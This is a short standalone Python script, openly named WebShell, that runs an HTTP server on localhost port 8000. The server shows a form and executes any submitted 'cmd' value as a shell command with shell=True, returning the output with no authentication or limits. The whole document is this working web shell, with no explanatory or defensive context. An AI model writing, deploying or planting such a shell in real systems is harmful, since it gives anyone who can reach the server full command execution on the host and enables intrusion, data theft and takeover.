import http.server, subprocess

class WebShell(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header('Content-type', 'text/html'); self.end_headers()
        self.wfile.write(b'<form method="POST"><input name="cmd"><input type="submit"></form>')

    def do_POST(self):
        length = int(self.headers['Content-Length'])
        cmd = self.rfile.read(length).decode().split('=')[1]
        output = subprocess.run(cmd, shell=True, capture_output=True, text=True).stdout
        self.send_response(200); self.send_header('Content-type', 'text/html'); self.end_headers()
        self.wfile.write(f'<pre>{output}</pre><form method="POST"><input name="cmd"><input type="submit"></form>'.encode())

http.server.HTTPServer(('localhost', 8000), WebShell).serve_forever()